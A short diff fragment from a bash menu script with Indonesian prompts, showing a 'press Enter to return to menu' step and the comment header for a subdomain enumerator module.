+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
 # --- [ MODUL 06: SUBDOMAIN ENUMERATOR (DETAILED TABLE) ] ---
 
